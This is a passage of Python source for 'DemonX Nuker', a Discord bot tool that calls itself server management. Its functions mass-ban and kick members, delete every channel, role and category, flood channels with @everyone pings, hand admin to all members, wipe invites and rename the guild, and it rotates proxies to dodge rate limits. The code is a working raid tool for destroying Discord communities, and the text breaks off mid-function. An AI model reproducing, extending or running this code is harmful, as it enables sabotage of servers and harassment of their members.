"""
DemonX Nuker - Complete Professional Edition
Author: Kirito / Demon
Full-featured Discord server management tool with all operations and advanced features
"""

import asyncio
import json
import random
import string
import time
import logging
import os
from typing import Optional, List, Dict, Any
from pathlib import Path
from datetime import datetime
from collections import defaultdict
from dataclasses import dataclass, asdict
from enum import Enum
import aiohttp

import discord
from discord.ext import commands
from colorama import init, Fore, Style

init(autoreset=True)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('demonx.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('DemonX')

class OperationType(Enum):
    """Operation types for history tracking"""
    BAN = "ban"
    KICK = "kick"
    PRUNE = "prune"
    NICKNAME = "nickname"
    GRANT_ADMIN = "grant_admin"
    UNBAN = "unban"
    ASSIGN_ROLE = "assign_role"
    REMOVE_ROLE = "remove_role"
    DELETE_CHANNEL = "delete_channel"
    CREATE_CHANNEL = "create_channel"
    RENAME_CHANNEL = "rename_channel"
    SHUFFLE_CHANNEL = "shuffle_channel"
    MASS_PING = "mass_ping"
    CREATE_CATEGORY = "create_category"
    DELETE_CATEGORY = "delete_category"
    CREATE_ROLE = "create_role"
    DELETE_ROLE = "delete_role"
    RENAME_ROLE = "rename_role"
    RENAME_GUILD = "rename_guild"
    DELETE_EMOJI = "delete_emoji"
    WEBHOOK_SPAM = "webhook_spam"
    REACT_MESSAGE = "react_message"

@dataclass
class OperationRecord:
    """Record of an operation"""
    operation_type: str
    timestamp: str
    success: bool
    details: Dict[str, Any]
    error: Optional[str] = None

class OperationHistory:
    """Track operation history with batched saves"""
    
    def __init__(self, history_file: str = "operation_history.json", batch_size: int = 50):
        self.history_file = history_file
        self.history: List[OperationRecord] = []
        self.batch_size = batch_size
        self.pending_saves = 0
        self.load_history()
    
    def load_history(self):
        """Load history from file"""
        try:
            if Path(self.history_file).exists():
                with open(self.history_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    self.history = [OperationRecord(**record) for record in data[-1000:]]  # Only load last 1000
        except Exception as e:
            logger.error(f"Error loading history: {e}")
    
    def save_history(self, force: bool = False):
        """Save history to file (batched for performance)"""
        if not force and self.pending_saves < self.batch_size:
            return
        
        try:
            with open(self.history_file, 'w', encoding='utf-8') as f:
                json.dump([asdict(record) for record in self.history], f, indent=2)
            self.pending_saves = 0
        except Exception as e:
            logger.error(f"Error saving history: {e}")
    
    def add_operation(self, operation_type: OperationType, success: bool, details: Dict, error: Optional[str] = None):
        """Add operation to history"""
        record = OperationRecord(
            operation_type=operation_type.value,
            timestamp=datetime.now().isoformat(),
            success=success,
            details=details,
            error=error
        )
        self.history.append(record)
        if len(self.history) > 1000:  # Keep last 1000 operations
            self.history = self.history[-1000:]
        self.pending_saves += 1
        self.save_history()
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get operation statistics (optimized)"""
        stats = defaultdict(int)
        for record in self.history:
            op_type = record.operation_type
            stats[op_type] += 1
            suffix = "_success" if record.success else "_failed"
            stats[f"{op_type}{suffix}"] += 1
        return dict(stats)
    
    def flush(self):
        """Force save history"""
        self.save_history(force=True)

class PresetManager:
    """Manage operation presets"""
    
    def __init__(self, preset_file: str = "presets.json"):
        self.preset_file = preset_file
        self.presets: Dict[str, List[Dict]] = {}
        self.load_presets()
    
    def load_presets(self):
        """Load presets from file"""
        try:
            if Path(self.preset_file).exists():
                with open(self.preset_file, 'r') as f:
                    self.presets = json.load(f)
        except Exception as e:
            logger.error(f"Error loading presets: {e}")
    
    def save_presets(self):
        """Save presets to file"""
        try:
            with open(self.preset_file, 'w') as f:
                json.dump(self.presets, f, indent=2)
        except Exception as e:
            logger.error(f"Error saving presets: {e}")
    
    def create_preset(self, name: str, operations: List[Dict]):
        """Create a new preset"""
        self.presets[name] = operations
        self.save_presets()
    
    def get_preset(self, name: str) -> Optional[List[Dict]]:
        """Get preset by name"""
        return self.presets.get(name)
    
    def list_presets(self) -> List[str]:
        """List all preset names"""
        return list(self.presets.keys())
    
    def delete_preset(self, name: str):
        """Delete a preset"""
        if name in self.presets:
            del self.presets[name]
            self.save_presets()

class ProxyManager:
    """Proxy manager with rotation and health checking"""
    
    def __init__(self, proxy_file: str = "proxies.txt"):
        self.proxy_file = proxy_file
        self.proxies: List[str] = []
        self.current_index = 0
        self.proxy_stats: Dict[str, Dict] = {}
        self.load_proxies()
    
    def load_proxies(self):
        """Load proxies from file"""
        try:
            if Path(self.proxy_file).exists():
                with open(self.proxy_file, 'r', encoding='utf-8') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                for proxy in self.proxies:
                    self.proxy_stats[proxy] = {
                        'success': 0,
                        'failed': 0,
                        'last_used': None
                    }
                logger.info(f"Loaded {len(self.proxies)} proxies")
        except Exception as e:
            logger.error(f"Error loading proxies: {e}")
    
    def parse_proxy(self, proxy_str: str) -> Optional[str]:
        """Parse proxy string to URL format
        Supports: IP:PORT:USERNAME:PASSWORD
        Returns: http://USERNAME:PASSWORD@IP:PORT
        """
        try:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                # Format: IP:PORT:USERNAME:PASSWORD
                ip, port, username, password = parts
                return f"http://{username}:{password}@{ip}:{port}"
            elif len(parts) == 2:
                # Format: IP:PORT (no auth)
                ip, port = parts
                return f"http://{ip}:{port}"
            else:
                logger.warning(f"Invalid proxy format: {proxy_str}")
                return None
        except Exception as e:
            logger.error(f"Error parsing proxy {proxy_str}: {e}")
            return None
    
    def get_next_proxy(self) -> Optional[str]:
        """Get next proxy in rotation"""
        if not self.proxies:
            return None
        
        proxy = self.proxies[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.proxies)
        self.proxy_stats[proxy]['last_used'] = time.time()
        return self.parse_proxy(proxy)
    
    def get_current_proxy(self) -> Optional[str]:
        """Get current proxy"""
        if not self.proxies:
            return None
        return self.parse_proxy(self.proxies[self.current_index])
    
    def mark_success(self, proxy_str: str):
        """Mark proxy as successful"""
        if proxy_str in self.proxy_stats:
            self.proxy_stats[proxy_str]['success'] += 1
    
    def mark_failed(self, proxy_str: str):
        """Mark proxy as failed"""
        if proxy_str in self.proxy_stats:
            self.proxy_stats[proxy_str]['failed'] += 1

class RateLimiter:
    """Advanced rate limiter"""
    
    def __init__(self):
        self.retry_after: Dict[str, float] = {}
        self.global_rate_limit: Optional[float] = None
    
    async def wait_for_rate_limit(self, endpoint: str = "global"):
        """Wait if rate limited"""
        if endpoint in self.retry_after:
            wait_time = self.retry_after[endpoint] - time.time()
            if wait_time > 0:
                await asyncio.sleep(wait_time)
                del self.retry_after[endpoint]
        
        if self.global_rate_limit:
            wait_time = self.global_rate_limit - time.time()
            if wait_time > 0:
                await asyncio.sleep(wait_time)
                self.global_rate_limit = None
    
    def handle_rate_limit(self, endpoint: str, retry_after: float, is_global: bool = False):
        """Handle rate limit"""
        if is_global:
            self.global_rate_limit = time.time() + retry_after
        else:
            self.retry_after[endpoint] = time.time() + retry_after

class DemonXComplete:
    """Complete DemonX Nuker with all features"""
    
    def __init__(self, token: str, use_proxy: bool = False, dry_run: bool = False):
        self.token = token
        self.use_proxy = use_proxy
        self.dry_run = dry_run
        self.rate_limiter = RateLimiter()
        self.operation_history = OperationHistory()
        self.preset_manager = PresetManager()
        self.proxy_manager = ProxyManager() if use_proxy else None
        self.proxy_url = None
        
        # Statistics
        self.stats = defaultdict(int)
        self.stats['start_time'] = time.time()
        
        # Get proxy URL if enabled
        if use_proxy and self.proxy_manager and self.proxy_manager.proxies:
            self.proxy_url = self.proxy_manager.get_current_proxy()
            if self.proxy_url:
                # Set proxy via environment variable for aiohttp (used by discord.py)
                import os
                os.environ['HTTP_PROXY'] = self.proxy_url
                os.environ['HTTPS_PROXY'] = self.proxy_url
                # Also set for discord.py's internal HTTP client
                proxy_display = self.proxy_url.split('@')[1] if '@' in self.proxy_url else self.proxy_url
                logger.info(f"Proxy configured: {proxy_display}")
        
        # Bot setup
        intents = discord.Intents.all()
        intents.message_content = True
        
        # Create connector with proxy if enabled
        connector = None
        if use_proxy and self.proxy_url:
            connector = aiohttp.TCPConnector()
        
        self.bot = commands.Bot(
            command_prefix='!',
            intents=intents,
            help_command=None,
            case_insensitive=True,
            connector=connector
        )
        
        # Patch HTTP client to use proxy for all requests
        if use_proxy and self.proxy_url and hasattr(self.bot, 'http'):
            original_session = self.bot.http._HTTPClient__session
            if original_session:
                # Update session proxy
                original_session._proxy = self.proxy_url
                original_session._proxy_auth = None
        
        self.setup_events()
    
    def setup_events(self):
        """Setup bot events"""
        # on_ready will be set in main() to access guild_id
        pass
    
    async def safe_execute(self, coro, retries: int = 3, endpoint: str = "global", operation_type: Optional[OperationType] = None):
        """Safely execute with error handling (optimized)"""
        await self.rate_limiter.wait_for_rate_limit(endpoint)
        
        if self.dry_run:
            logger.info(f"[DRY RUN] Would execute: {operation_type}")
            return True
        
        last_error = None
        for attempt in range(retries):
            try:
                result = await coro
                if operation_type:
                    self.operation_history.add_operation(operation_type, True, {})
                return result
            except discord.HTTPException as e:
                last_error = e
                if e.status == 429:
                    retry_after = float(e.response.headers.get('Retry-After', 1))
                    is_global = e.response.headers.get('X-RateLimit-Global', 'false').lower() == 'true'
                    self.rate_limiter.handle_rate_limit(endpoint, retry_after, is_global)
                    await asyncio.sleep(retry_after + 0.1)
                    continue
                elif e.status in [403, 404]:
                    # Non-retryable errors
                    break
                elif attempt < retries - 1:
                    await asyncio.sleep(2 ** attempt)
                    continue
            except Exception as e:
                last_error = e
                if attempt < retries - 1:
                    await asyncio.sleep(2 ** attempt)
                    continue
        
        # All retries failed
        if operation_type and last_error:
            error_str = str(last_error)
            self.operation_history.add_operation(operation_type, False, {}, error_str)
        self.stats['errors'] += 1
        if last_error:
            logger.error(f"Error in safe_execute after {retries} attempts: {last_error}")
        return False
    
    # ==================== MEMBER MANAGEMENT ====================
    
    async def ban_all_members(self, guild: discord.Guild, reason: str = "Nuked"):
        """Ban all members (optimized)"""
        print(f"\n{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.YELLOW}{Style.BRIGHT}  [*] Starting Ban Operation...{Fore.CYAN}{' ' * 37}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
        
        # Filter members once
        bot_id = self.bot.user.id
        bot_top_role = guild.me.top_role
        members_to_ban = [m for m in guild.members 
                          if m.id != bot_id and m.top_role < bot_top_role]
        
        if not members_to_ban:
            print(f"{Fore.YELLOW}[*] No members to ban{Style.RESET_ALL}\n")
            return
        
        endpoint = f"guilds/{guild.id}/bans"
        tasks = []
        for member in members_to_ban:
            async def ban_member(m):
                result = await self.safe_execute(
                    guild.ban(m, reason=reason, delete_message_days=7),
                    endpoint=endpoint,
                    operation_type=OperationType.BAN
                )
                if result is not False:
                    self.stats['banned'] += 1
                    print(f"{Fore.GREEN}[+] Banned {m}")
            
            tasks.append(ban_member(member))
        
        # Optimized batch processing
        batch_size = 20  # Increased batch size
        for i in range(0, len(tasks), batch_size):
            await asyncio.gather(*tasks[i:i + batch_size], return_exceptions=True)
            if i + batch_size < len(tasks):  # Don't sleep after last batch
                await asyncio.sleep(0.2)  # Reduced delay
        
        print(f"\n{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.GREEN}{Style.BRIGHT}  [+] Successfully Banned: {self.stats['banned']} Members{Fore.CYAN}{' ' * (35 - len(str(self.stats['banned'])))}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
    
    async def kick_all_members(self, guild: discord.Guild, reason: str = "Nuked"):
        """Kick all members (optimized)"""
        print(f"\n{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.YELLOW}{Style.BRIGHT}  [*] Starting Kick Operation...{Fore.CYAN}{' ' * 37}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
        
        # Filter members once
        bot_id = self.bot.user.id
        bot_top_role = guild.me.top_role
        members_to_kick = [m for m in guild.members 
                          if m.id != bot_id and m.top_role < bot_top_role]
        
        if not members_to_kick:
            print(f"{Fore.YELLOW}[*] No members to kick{Style.RESET_ALL}\n")
            return
        
        base_endpoint = f"guilds/{guild.id}/members"
        tasks = []
        for member in members_to_kick:
            async def kick_member(m):
                result = await self.safe_execute(
                    guild.kick(m, reason=reason),
                    endpoint=f"{base_endpoint}/{m.id}",
                    operation_type=OperationType.KICK
                )
                if result is not False:
                    self.stats['kicked'] += 1
                    print(f"{Fore.GREEN}[+] Kicked {m}")
            
            tasks.append(kick_member(member))
        
        # Optimized batch processing
        batch_size = 20
        for i in range(0, len(tasks), batch_size):
            await asyncio.gather(*tasks[i:i + batch_size], return_exceptions=True)
            if i + batch_size < len(tasks):
                await asyncio.sleep(0.2)
        
        print(f"\n{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.GREEN}{Style.BRIGHT}  [+] Successfully Kicked: {self.stats['kicked']} Members{Fore.CYAN}{' ' * (35 - len(str(self.stats['kicked'])))}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
    
    async def prune_members(self, guild: discord.Guild, days: int = 7):
        """Prune inactive members"""
        print(f"{Fore.YELLOW}[*] Pruning members...")
        result = await self.safe_execute(
            guild.prune_members(days=days, reason="Prune"),
            endpoint=f"guilds/{guild.id}/prune",
            operation_type=OperationType.PRUNE
        )
        if result:
            print(f"{Fore.GREEN}[+] Pruned members")
    
    async def mass_nickname(self, guild: discord.Guild, nickname: str = None):
        """Change all member nicknames (optimized)"""
        print(f"{Fore.YELLOW}[*] Changing nicknames...")
        
        if nickname is None:
            nickname = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        
        # Filter out bot
        bot_id = self.bot.user.id
        members_to_nick = [m for m in guild.members if m.id != bot_id]
        
        if not members_to_nick:
            print(f"{Fore.YELLOW}[*] No members to nickname{Style.RESET_ALL}")
            return
        
        base_endpoint = f"guilds/{guild.id}/members"
        tasks = []
        for member in members_to_nick:
            async def change_nick(m, nick):
                result = await self.safe_execute(
                    m.edit(nick=nick),
                    endpoint=f"{base_endpoint}/{m.id}",
                    operation_type=OperationType.NICKNAME
                )
                if result is not False:
                    print(f"{Fore.GREEN}[+] Changed nickname for {m}")
            
            tasks.append(change_nick(member, nickname))
        
        # Optimized batch processing
        batch_size = 15
        for i in range(0, len(tasks), batch_size):
            await asyncio.gather(*tasks[i:i + batch_size], return_exceptions=True)
            if i + batch_size < len(tasks):
                await asyncio.sleep(0.3)
    
    async def grant_admin_all(self, guild: discord.Guild):
        """Grant admin to all members"""
        print(f"{Fore.YELLOW}[*] Granting admin...")
        try:
            admin_role = await self.safe_execute(
                guild.create_role(name="Admin", permissions=discord.Permissions.all(), reason="Admin"),
                endpoint=f"guilds/{guild.id}/roles",
                operation_type=OperationType.GRANT_ADMIN
            )
            
            if admin_role:
                tasks = []
                for member in guild.members:
                    async def add_admin(m, role):
                        await self.safe_execute(
                            m.add_roles(role),
                            endpoint=f"guilds/{guild.id}/members/{m.id}/roles/{role.id}",
                            operation_type=OperationType.GRANT_ADMIN
                        )
                    
                    tasks.append(add_admin(member, admin_role))
                
                await asyncio.gather(*tasks, return_exceptions=True)
                print(f"{Fore.GREEN}[+] Granted admin to all members")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
    
    async def unban_all_members(self, guild: discord.Guild):
        """Unban all members"""
        print(f"{Fore.YELLOW}[*] Unbanning all...")
        try:
            bans = [entry async for entry in guild.bans()]
            tasks = []
            for ban_entry in bans:
                async def unban(entry):
                    result = await self.safe_execute(
                        guild.unban(entry.user),
                        endpoint=f"guilds/{guild.id}/bans/{entry.user.id}",
                        operation_type=OperationType.UNBAN
                    )
                    if result is not False:
                        print(f"{Fore.GREEN}[+] Unbanned {entry.user}")
                
                tasks.append(unban(ban_entry))
            
            await asyncio.gather(*tasks, return_exceptions=True)
            print(f"{Fore.GREEN}[+] Unbanned {len(bans)} members")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
    
    async def unban_member(self, guild: discord.Guild, user_id: int):
        """Unban specific member"""
        try:
            user = await self.bot.fetch_user(user_id)
            result = await self.safe_execute(
                guild.unban(user),
                endpoint=f"guilds/{guild.id}/bans/{user_id}",
                operation_type=OperationType.UNBAN
            )
            if result is not False:
                print(f"{Fore.GREEN}[+] Unbanned {user}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
    
    async def mass_assign_role(self, guild: discord.Guild, role: discord.Role):
        """Assign role to all members"""
        print(f"{Fore.YELLOW}[*] Assigning role to all members...")
        tasks = []
        for member in guild.members:
            async def assign_role(m, r):
                result = await self.safe_execute(
                    m.add_roles(r),
                    endpoint=f"guilds/{guild.id}/members/{m.id}/roles/{r.id}",
                    operation_type=OperationType.ASSIGN_ROLE
                )
                if result is not False:
                    print(f"{Fore.GREEN}[+] Assigned role to {m}")
            
            tasks.append(assign_role(member, role))
        
        batch_size = 10
        for i in range(0, len(tasks), batch_size):
            await asyncio.gather(*tasks[i:i + batch_size], return_exceptions=True)
            await asyncio.sleep(0.4)
    
    async def remove_role_from_all(self, guild: discord.Guild, role: discord.Role):
        """Remove role from all members"""
        print(f"{Fore.YELLOW}[*] Removing role from all members...")
        tasks = []
        for member in guild.members:
            if role in member.roles:
                async def remove_role(m, r):
                    result = await self.safe_execute(
                        m.remove_roles(r),
                        endpoint=f"guilds/{guild.id}/members/{m.id}/roles/{r.id}",
                        operation_type=OperationType.REMOVE_ROLE
                    )
                    if result is not False:
                        print(f"{Fore.GREEN}[+] Removed role from {m}")
                
                tasks.append(remove_role(member, role))
        
        batch_size = 10
        for i in range(0, len(tasks), batch_size):
            await asyncio.gather(*tasks[i:i + batch_size], return_exceptions=True)
            await asyncio.sleep(0.4)
    
    # ==================== CHANNEL MANAGEMENT ====================
    
    async def delete_channels(self, guild: discord.Guild):
        """Delete all channels"""
        print(f"\n{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.YELLOW}{Style.BRIGHT}  [*] Starting Channel Deletion...{Fore.CYAN}{' ' * 36}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
        tasks = []
        for channel in guild.channels:
            async def delete_channel(ch):
                result = await self.safe_execute(
                    ch.delete(),
                    endpoint=f"channels/{ch.id}",
                    operation_type=OperationType.DELETE_CHANNEL
                )
                if result is not False:
                    self.stats['channels_deleted'] += 1
                    print(f"{Fore.GREEN}[+] Deleted {ch.name}")
            
            tasks.append(delete_channel(channel))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"\n{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.GREEN}{Style.BRIGHT}  [+] Successfully Deleted: {self.stats['channels_deleted']} Channels{Fore.CYAN}{' ' * (33 - len(str(self.stats['channels_deleted'])))}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
    
    async def create_channels(self, guild: discord.Guild, count: int = 50, name: str = None):
        """Create multiple channels (optimized)"""
        print(f"\n{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.YELLOW}{Style.BRIGHT}  [*] Creating {count} Channels...{Fore.CYAN}{' ' * (40 - len(str(count)))}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
        
        if name is None:
            name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        
        endpoint = f"guilds/{guild.id}/channels"
        tasks = []
        for i in range(count):
            async def create_channel(idx):
                result = await self.safe_execute(
                    guild.create_text_channel(f"{name}-{idx}"),
                    endpoint=endpoint,
                    operation_type=OperationType.CREATE_CHANNEL
                )
                if result:
                    self.stats['channels_created'] += 1
                return result
            
            tasks.append(create_channel(i))
        
        # Optimized batch processing
        batch_size = 10  # Increased batch size
        for i in range(0, len(tasks), batch_size):
            await asyncio.gather(*tasks[i:i + batch_size], return_exceptions=True)
            if i + batch_size < len(tasks):
                await asyncio.sleep(0.2)  # Reduced delay
        
        print(f"\n{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.GREEN}{Style.BRIGHT}  [+] Successfully Created: {self.stats['channels_created']} Channels{Fore.CYAN}{' ' * (33 - len(str(self.stats['channels_created'])))}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
    
    async def rename_channels(self, guild: discord.Guild, name: str = None):
        """Rename all channels (optimized)"""
        print(f"{Fore.YELLOW}[*] Renaming channels...")
        
        if name is None:
            name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        
        channels = list(guild.channels)
        if not channels:
            print(f"{Fore.YELLOW}[*] No channels to rename{Style.RESET_ALL}")
            return
        
        tasks = []
        for i, channel in enumerate(channels):
            async def rename_channel(ch, idx):
                result = await self.safe_execute(
                    ch.edit(name=f"{name}-{idx}"),
                    endpoint=f"channels/{ch.id}",
                    operation_type=OperationType.RENAME_CHANNEL
                )
                if result is not False:
                    print(f"{Fore.GREEN}[+] Renamed {ch.name}")
            
            tasks.append(rename_channel(channel, i))
        
        # Optimized batch processing
        batch_size = 10
        for i in range(0, len(tasks), batch_size):
            await asyncio.gather(*tasks[i:i + batch_size], return_exceptions=True)
            if i + batch_size < len(tasks):
                await asyncio.sleep(0.2)
    
    async def shuffle_channels(self, guild: discord.Guild):
        """Shuffle channel positions"""
        print(f"{Fore.YELLOW}[*] Shuffling channels...")
        channels = list(guild.channels)
        random.shuffle(channels)
        
        tasks = []
        for i, channel in enumerate(channels):
            async def move_channel(ch, pos):
                await self.safe_execute(
                    ch.edit(position=pos),
                    endpoint=f"channels/{ch.id}",
                    operation_type=OperationType.SHUFFLE_CHANNEL
                )
            
            tasks.append(move_channel(channel, i))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{Fore.GREEN}[+] Shuffled channels")
    
    async def mass_ping(self, guild: discord.Guild, message: str = "@everyone Nuked", count: int = 5):
        """Mass ping in all channels (optimized)"""
        print(f"{Fore.YELLOW}[*] Mass pinging...")
        
        text_channels = guild.text_channels
        if not text_channels:
            print(f"{Fore.YELLOW}[*] No text channels found{Style.RESET_ALL}")
            return
        
        tasks = []
        for channel in text_channels:
            async def ping_channel(ch):
                endpoint = f"channels/{ch.id}/messages"
                for _ in range(count):
                    result = await self.safe_execute(
                        ch.send(message),
                        endpoint=endpoint,
                        operation_type=OperationType.MASS_PING
                    )
                    if result:
                        self.stats['messages_sent'] += 1
                    await asyncio.sleep(0.05)  # Reduced delay
            
            tasks.append(ping_channel(channel))
        
        # Process in batches to avoid overwhelming
        batch_size = 10
        for i in range(0, len(tasks), batch_size):
            await asyncio.gather(*tasks[i:i + batch_size], return_exceptions=True)
            if i + batch_size < len(tasks):
                await asyncio.sleep(0.1)
        
        print(f"{Fore.GREEN}[+] Sent {self.stats['messages_sent']} messages")
    
    async def create_categories(self, guild: discord.Guild, count: int = 10, name: str = None):
        """Create channel categories"""
        print(f"{Fore.YELLOW}[*] Creating categories...")
        if name is None:
            name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        
        tasks = []
        for i in range(count):
            async def create_category(idx):
                result = await self.safe_execute(
                    guild.create_category(f"{name}-{idx}"),
                    endpoint=f"guilds/{guild.id}/channels",
                    operation_type=OperationType.CREATE_CATEGORY
                )
                return result
            
            tasks.append(create_category(i))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{Fore.GREEN}[+] Created {count} categories")
    
    async def delete_categories(self, guild: discord.Guild):
        """Delete all categories"""
        print(f"{Fore.YELLOW}[*] Deleting categories...")
        tasks = []
        for category in guild.categories:
            async def delete_category(cat):
                result = await self.safe_execute(
                    cat.delete(),
                    endpoint=f"channels/{cat.id}",
                    operation_type=OperationType.DELETE_CATEGORY
                )
                if result is not False:
                    print(f"{Fore.GREEN}[+] Deleted category {cat.name}")
            
            tasks.append(delete_category(category))
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def shuffle_categories(self, guild: discord.Guild):
        """Shuffle category positions"""
        print(f"{Fore.YELLOW}[*] Shuffling categories...")
        categories = list(guild.categories)
        random.shuffle(categories)
        
        tasks = []
        for i, category in enumerate(categories):
            async def move_category(cat, pos):
                await self.safe_execute(
                    cat.edit(position=pos),
                    endpoint=f"channels/{cat.id}",
                    operation_type=OperationType.SHUFFLE_CHANNEL
                )
            
            tasks.append(move_category(category, i))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{Fore.GREEN}[+] Shuffled categories")
    
    # ==================== ROLE MANAGEMENT ====================
    
    async def create_roles(self, guild: discord.Guild, count: int = 50, name: str = None):
        """Create multiple roles (optimized)"""
        print(f"{Fore.YELLOW}[*] Creating {count} roles...")
        
        if name is None:
            name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        
        endpoint = f"guilds/{guild.id}/roles"
        tasks = []
        for i in range(count):
            async def create_role(idx):
                result = await self.safe_execute(
                    guild.create_role(name=f"{name}-{idx}"),
                    endpoint=endpoint,
                    operation_type=OperationType.CREATE_ROLE
                )
                if result:
                    self.stats['roles_created'] += 1
                return result
            
            tasks.append(create_role(i))
        
        # Optimized batch processing
        batch_size = 10
        for i in range(0, len(tasks), batch_size):
            await asyncio.gather(*tasks[i:i + batch_size], return_exceptions=True)
            if i + batch_size < len(tasks):
                await asyncio.sleep(0.2)
        
        print(f"{Fore.GREEN}[+] Created {self.stats['roles_created']} roles")
    
    async def delete_roles(self, guild: discord.Guild):
        """Delete all roles"""
        print(f"{Fore.YELLOW}[*] Deleting all roles...")
        tasks = []
        for role in guild.roles:
            if role.id == guild.id:
                continue
            
            async def delete_role(r):
                result = await self.safe_execute(
                    r.delete(),
                    endpoint=f"guilds/{guild.id}/roles/{r.id}",
                    operation_type=OperationType.DELETE_ROLE
                )
                if result is not False:
                    self.stats['roles_deleted'] += 1
                    print(f"{Fore.GREEN}[+] Deleted {r.name}")
            
            tasks.append(delete_role(role))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{Fore.GREEN}[+] Deleted {self.stats['roles_deleted']} roles")
    
    async def rename_roles(self, guild: discord.Guild, name: str = None):
        """Rename all roles (optimized)"""
        print(f"{Fore.YELLOW}[*] Renaming roles...")
        
        if name is None:
            name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        
        # Filter out @everyone role
        guild_id = guild.id
        roles_to_rename = [r for r in guild.roles if r.id != guild_id]
        
        if not roles_to_rename:
            print(f"{Fore.YELLOW}[*] No roles to rename{Style.RESET_ALL}")
            return
        
        base_endpoint = f"guilds/{guild.id}/roles"
        tasks = []
        for i, role in enumerate(roles_to_rename):
            async def rename_role(r, idx):
                result = await self.safe_execute(
                    r.edit(name=f"{name}-{idx}"),
                    endpoint=f"{base_endpoint}/{r.id}",
                    operation_type=OperationType.RENAME_ROLE
                )
                if result is not False:
                    print(f"{Fore.GREEN}[+] Renamed {r.name}")
            
            tasks.append(rename_role(role, i))
        
        # Optimized batch processing
        batch_size = 10
        for i in range(0, len(tasks), batch_size):
            await asyncio.gather(*tasks[i:i + batch_size], return_exceptions=True)
            if i + batch_size < len(tasks):
                await asyncio.sleep(0.2)
    
    async def copy_role_permissions(self, guild: discord.Guild, source_role: discord.Role, target_role: discord.Role):
        """Copy permissions from one role to another"""
        try:
            await self.safe_execute(
                target_role.edit(permissions=source_role.permissions),
                endpoint=f"guilds/{guild.id}/roles/{target_role.id}"
            )
            print(f"{Fore.GREEN}[+] Copied permissions from {source_role.name} to {target_role.name}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
    
    # ==================== GUILD MANAGEMENT ====================
    
    async def rename_guild(self, guild: discord.Guild, name: str = None):
        """Rename guild"""
        if name is None:
            name = ''.join(random.choices(string.ascii_letters + string.digits, k=15))
        
        result = await self.safe_execute(
            guild.edit(name=name),
            endpoint=f"guilds/{guild.id}",
            operation_type=OperationType.RENAME_GUILD
        )
        if result is not False:
            print(f"{Fore.GREEN}[+] Renamed guild to {name}")
    
    async def modify_verification_level(self, guild: discord.Guild, level: discord.VerificationLevel):
        """Modify verification level"""
        try:
            await self.safe_execute(
                guild.edit(verification_level=level),
                endpoint=f"guilds/{guild.id}"
            )
            print(f"{Fore.GREEN}[+] Changed verification level")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
    
    async def change_afk_timeout(self, guild: discord.Guild, timeout: int):
        """Change AFK timeout"""
        try:
            await self.safe_execute(
                guild.edit(afk_timeout=timeout),
                endpoint=f"guilds/{guild.id}"
            )
            print(f"{Fore.GREEN}[+] Changed AFK timeout to {timeout}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
    
    async def delete_all_invites(self, guild: discord.Guild):
        """Delete all invites"""
        print(f"{Fore.YELLOW}[*] Deleting all invites...")
        try:
            invites = await guild.invites()
            tasks = []
            for invite in invites:
                async def delete_invite(inv):
                    try:
                        await inv.delete()
                        print(f"{Fore.GREEN}[+] Deleted invite {inv.code}")
                    except:
                        pass
                
                tasks.append(delete_invite(invite))
            
            await asyncio.gather(*tasks, return_exceptions=True)
            print(f"{Fore.GREEN}[+] Deleted {len(invites)} invites")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
    
    async def create_invites(self, guild: discord.Guild, count: int = 10):
        """Create invites"""
        print(f"{Fore.YELLOW}[*] Creating invites...")
        tasks = []
        for channel in guild.text_channels[:5]:  # Use first 5 channels
            for _ in range(count // 5):
                async def create_invite(ch):
                    try:
                        invite = await ch.create_invite(max_age=0, max_uses=0)
                        print(f"{Fore.GREEN}[+] Created invite {invite.url}")
                        return invite
                    except:
                        return None
                
                tasks.append(create_invite(channel))
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def get_all_invites(self, guild: discord.Guild):
        """Get all invites"""
